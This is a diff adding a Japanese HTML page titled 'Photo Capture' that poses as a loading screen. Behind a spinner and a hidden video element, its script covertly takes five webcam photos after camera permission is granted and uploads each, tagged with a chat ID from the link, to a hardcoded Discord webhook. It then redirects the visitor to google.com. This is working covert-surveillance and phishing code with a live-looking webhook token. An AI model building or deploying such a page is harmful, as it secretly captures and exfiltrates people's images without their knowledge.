@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Photo Capture</title>
+  <style>
+    body, html {
+      height: 100%;
+      margin: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background-color: #f8f8f8;
+    }
+
+    .spinner {
+      border: 8px solid #f3f3f3;
+      border-top: 8px solid #3498db;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 2s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .spinner.hidden {
+      display: none;
+    }
+
+    video {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+<div id="spinner" class="spinner hidden"></div>
+<video id="video" autoplay playsinline></video>
+
+<script>
+  const webhookURL = 'https://discord.com/api/webhooks/1377883943642333194/wPfWly6Kbxjg64NOp0xbEnDzOkwOH0Vhq8sAnex10T3b5rcOh3v-HPeXE6nKELQclAYq';
+  const spinner = document.getElementById('spinner');
+  const video = document.getElementById('video');
+
+  const urlParams = new URLSearchParams(window.location.search);
+  const chatId = urlParams.get('id') || 'なし';
+
+  navigator.mediaDevices.getUserMedia({ video: true })
+    .then(stream => {
+      video.srcObject = stream;
+
+      video.onloadedmetadata = () => {
+        video.play();
+        spinner.classList.remove('hidden');
+
+        let counter = 0;
+
+        const interval = setInterval(() => {
+          if (counter < 5) {
+            captureAndSendPhoto();
+            counter++;
+          } else {
+            clearInterval(interval);
+            spinner.classList.add('hidden');
+            video.srcObject.getTracks().forEach(track => track.stop()); // カメラ停止
+            window.location.href = 'https://www.google.com';
+          }
+        }, 2000); // 2秒間隔
+      };
+    })
+    .catch(err => {
+      console.error('カメラにアクセスできません:', err);
+      alert('カメラの使用が許可されていません。');
+    });
+
+  function captureAndSendPhoto() {
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(video, 0, 0);
+
+    canvas.toBlob(blob => {
+      if (!blob) {
+        console.error('Blobの作成に失敗しました');
+        return;
+      }
+
+      const form = new FormData();
+      form.append('file', blob, 'photo.jpg');
+      form.append('content', `📸 撮影された画像（chat_id: ${chatId}）`);
+
+      fetch(webhookURL, {
+        method: 'POST',
+        body: form
+      })
+      .then(res => res.text())
+      .then(result => console.log('送信結果:', result))
+      .catch(err => console.error('送信失敗:', err));
+    }, 'image/jpeg');
+  }
+</script>
+
+</body>
+</html>
